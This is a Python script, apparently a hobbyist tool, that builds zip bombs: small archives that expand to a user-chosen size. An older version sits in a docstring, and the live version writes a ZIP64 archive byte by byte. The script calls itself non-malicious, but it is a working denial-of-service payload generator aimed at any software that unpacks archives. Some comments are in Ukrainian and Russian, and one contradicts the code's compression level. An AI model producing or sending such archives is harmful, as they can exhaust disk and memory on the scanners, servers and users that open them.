"""import zipfile
import zlib
import struct
import time
import os

print("Welcome to the zip bomb generator!\nThis will make a non-malicious zip bomb.")

file_name = input("What would you like to call the zip?: ")
file_size_mb = int(input("What do you want the total uncompressed size to be (in MB)?: "))
file_count = int(input("What do you want the file count inside of the zip file to be?: "))
zip_inside_name = input("What name for files inside?: ")
zip_inside_format = input("What format for files inside?: ")


def make_unique_content(base_content: bytes, seed: int) -> bytes:
    prefix = f"FILE-{seed:08d}:".encode('utf-8')
    return prefix + base_content[len(prefix):]


def create_files(zip_name, inside_name, inside_format, total_size_mb, count):
    try:
        bytes_per_file = (total_size_mb * 1024 * 1024) // count
        base_content = b'0' * bytes_per_file

        start = time.time()

        with open(f'{zip_name}.zip', 'wb') as f:
            offset = 0
            offsets = []
            crcs = []
            compressed_sizes = []

            for i in range(count):
                print(i)
                filename = f"{inside_name}-{i}.{inside_format}"
                fname_bytes = filename.encode('utf-8')
                offsets.append(offset)

                # Унікальний вміст для кожного файлу
                content = make_unique_content(base_content, i)
                compressed_data = zlib.compress(content, level=1)[2:-4]  # level=1 — швидко
                crc = zlib.crc32(content) & 0xFFFFFFFF
                crcs.append(crc)
                compressed_sizes.append(len(compressed_data))

                local_header = struct.pack(
                    '<4s2B4HL2L2H',
                    b'PK\x03\x04',
                    20, 0,
                    0,
                    8,
                    0, 0,
                    crc,
                    len(compressed_data),
                    len(content),
                    len(fname_bytes),
                    0
                )
                f.write(local_header)
                f.write(fname_bytes)
                f.write(compressed_data)

                offset += len(local_header) + len(fname_bytes) + len(compressed_data)

                if i % 100 == 0 or i == count - 1:
                    print(f"Progress: {i+1}/{count} files...", end='\r')

            # Central directory
            cd_start = offset
            for i in range(count):
                filename = f"{inside_name}-{i}.{inside_format}"
                fname_bytes = filename.encode('utf-8')
                content_size = (total_size_mb * 1024 * 1024) // count

                cd_entry = struct.pack(
                    '<4s4B4HL2L5H2L',
                    b'PK\x01\x02',
                    20, 0,
                    20, 0,
                    0,
                    8,
                    0, 0,
                    crcs[i],
                    compressed_sizes[i],
                    content_size,
                    len(fname_bytes),
                    0, 0, 0,
                    0,
                    0,
                    offsets[i]
                )
                f.write(cd_entry)
                f.write(fname_bytes)

            cd_end = f.tell()
            cd_size = cd_end - cd_start

            eocd = struct.pack(
                '<4s4H2LH',
                b'PK\x05\x06',
                0, 0,
                count, count,
                cd_size,
                cd_start,
                0
            )
            f.write(eocd)

        elapsed = time.time() - start
        print(f"\nDone! '{zip_name}.zip' created in {elapsed:.2f}s")

    except Exception as e:
        print('Error:', e)


create_files(file_name, zip_inside_name, zip_inside_format, file_size_mb, file_count)
"""




import zipfile
import zlib
import struct
import time
import os

import struct, zlib, os, time

def pack_zip64_extra(uncompressed, compressed, local_offset=None):
    """ZIP64 extra field (tag 0x0001)"""
    data = struct.pack('<QQ', uncompressed, compressed)
    if local_offset is not None:
        data += struct.pack('<Q', local_offset)
    return struct.pack('<HH', 0x0001, len(data)) + data

def create_files_sequential_zip64(zip_name, inside_name, inside_format, total_size_mb, count):
    total_bytes = total_size_mb * 1024 * 1024
    bytes_per_file = total_bytes // count

    filename = f"{inside_name}.{inside_format}"
    fname_bytes = filename.encode('utf-8')

    prefix_len = len(f"FILE-{0:08d}:".encode('utf-8'))
    padding = b'0' * (bytes_per_file - prefix_len)

    zip64_extra_local = pack_zip64_extra(0, 0)
    extra_local_len = len(zip64_extra_local)
    local_header_size = struct.calcsize('<4s2B4HL2L2H') + len(fname_bytes) + extra_local_len

    start = time.time()

    with open(f'{zip_name}.zip', 'wb') as f:
        f.write(b'\x00' * local_header_size)

        # level=1 — быстро, но слабо. wbits=-15 — raw deflate (без gzip-заголовка)
        compressor = zlib.compressobj(level=6, wbits=-15)
        final_crc = 0
        total_uncompressed = 0
        total_compressed = 0

        report_every = max(1, count // 100)  # прогресс каждый 1%

        for i in range(count):
            print(i)
            prefix = f"FILE-{i:08d}:".encode('utf-8')
            chunk = prefix + padding

            final_crc = zlib.crc32(chunk, final_crc)

            # Z_SYNC_FLUSH каждые 1000 итераций — сбрасывает буфер на диск,
            # иначе zlib накапливает всё в памяти
            if i % 1000 == 999:
                compressed = compressor.compress(chunk)
                compressed += compressor.flush(zlib.Z_SYNC_FLUSH)
            else:
                compressed = compressor.compress(chunk)

            if compressed:
                f.write(compressed)
                total_compressed += len(compressed)

            total_uncompressed += len(chunk)

            if i % report_every == 0:
                elapsed = time.time() - start
                pct = (i + 1) / count * 100
                speed_mb = total_uncompressed / 1024 / 1024 / max(elapsed, 0.001)
                eta = (count - i) / max(i / max(elapsed, 0.001), 1)
                print(f"  {pct:.1f}% | {speed_mb:.0f} MB/s | ETA {eta:.0f}s", end='\r')

        tail = compressor.flush()
        if tail:
            f.write(tail)
            total_compressed += len(tail)

        final_crc &= 0xFFFFFFFF

        print(f"\n  Done compressing. Ratio: {total_compressed/total_uncompressed*100:.1f}%")
        print("  Writing Central Directory...")

        cd_offset = local_header_size + total_compressed

        zip64_extra_cd = pack_zip64_extra(total_uncompressed, total_compressed, local_offset=0)

        cd_entry = struct.pack(
            '<4s2H4HL2L5H2L',
            b'PK\x01\x02',
            45, 45,
            0, 8, 0, 0,
            final_crc,
            0xFFFFFFFF,
            0xFFFFFFFF,
            len(fname_bytes),
            len(zip64_extra_cd),
            0, 0, 0,
            0,
            0xFFFFFFFF
        )
        f.write(cd_entry)
        f.write(fname_bytes)
        f.write(zip64_extra_cd)

        cd_size = len(cd_entry) + len(fname_bytes) + len(zip64_extra_cd)

        zip64_eocd = struct.pack(
            '<4sQ2H2L4Q',
            b'PK\x06\x06',
            44,
            45, 45,
            0, 0,
            1, 1,
            cd_size,
            cd_offset
        )
        f.write(zip64_eocd)

        zip64_locator = struct.pack(
            '<4sLQL',
            b'PK\x06\x07',
            0,
            cd_offset + cd_size,
            1
        )
        f.write(zip64_locator)

        eocd = struct.pack(
            '<4s4H2LH',
            b'PK\x05\x06',
            0xFFFF, 0xFFFF,
            0xFFFF, 0xFFFF,
            0xFFFFFFFF,
            0xFFFFFFFF,
            0
        )
        f.write(eocd)

        # Записываем реальный local header
        f.seek(0)
        local_header = struct.pack(
            '<4s2B4HL2L2H',
            b'PK\x03\x04',
            45, 0,
            0, 8, 0, 0,
            final_crc,
            0xFFFFFFFF,
            0xFFFFFFFF,
            len(fname_bytes),
            extra_local_len
        )
        f.write(local_header)
        f.write(fname_bytes)
        f.write(pack_zip64_extra(total_uncompressed, total_compressed))

    elapsed = time.time() - start
    zip_size_mb = os.path.getsize(f'{zip_name}.zip') / 1024 / 1024
    print(f"\nDone! '{zip_name}.zip' ({zip_size_mb:.1f} MB) → {total_size_mb} MB uncompressed")
    print(f"Time: {elapsed:.1f}s | Avg speed: {total_size_mb/elapsed:.0f} MB/s")
file_name = input("What would you like to call the zip?: ")
file_size_mb = int(input("What do you want the total uncompressed size to be (in MB)?: "))
file_count = int(input("What do you want the file count inside of the zip file to be?: "))
zip_inside_name = input("What name for files inside?: ")
zip_inside_format = input("What format for files inside?: ")

create_files_sequential_zip64(file_name, zip_inside_name, zip_inside_format, file_size_mb, file_count)